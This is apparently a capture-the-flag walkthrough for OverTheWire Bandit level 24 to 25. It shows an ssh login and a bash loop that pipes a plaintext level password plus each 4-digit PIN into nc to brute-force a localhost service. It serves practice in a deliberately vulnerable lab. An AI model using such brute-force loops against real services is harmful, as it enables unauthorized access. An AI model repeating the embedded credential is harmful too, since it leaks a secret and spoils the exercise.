OverTheWire Bandit: Level 24 → 25

Objective
Retrieve the password for Level 25.
The password is protected by a service on localhost port 30002 that requires the correct 4-digit PIN along with the Level 24 password.

Steps
Log in as bandit24:
ssh bandit24@bandit.labs.overthewire.org -p 2220
Brute-force the 4-digit PIN using a loop and nc:
for i in {0000..9999}; do
echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002
done
Observe the output to identify the correct response.

Result
The correct PIN returns the password for Bandit Level 25.
